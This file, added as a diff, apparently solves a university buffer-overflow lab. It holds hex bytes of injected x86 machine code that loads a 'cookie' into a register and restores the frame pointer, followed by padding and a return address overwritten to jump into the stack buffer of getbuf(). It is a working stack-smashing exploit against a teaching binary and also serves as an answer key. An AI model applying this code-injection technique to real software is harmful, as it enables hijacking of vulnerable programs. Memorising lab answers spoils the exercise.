@@ -1,0 +1,16 @@
+/* my cookie is 0x7f7eec0d */
+/* the next instruction of getbuf(): 0x8048e81 */
+/* ebp: 0x55683460 */
+
+/* Padding required:	44bytes */
+/* local buffer starts at 0x55683408 */
+
+b8 0d ec 7e 7f       	/* mov    $0x7f7eec0d,%eax */
+bd 60 34 68 55       	/* mov    $0x55683460,%ebp */
+68 81 8e 04 08    	/* push   $0x8048e81 */
+c3 00 00 00 00          /* ret */   
+
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00
+08 34 68 55
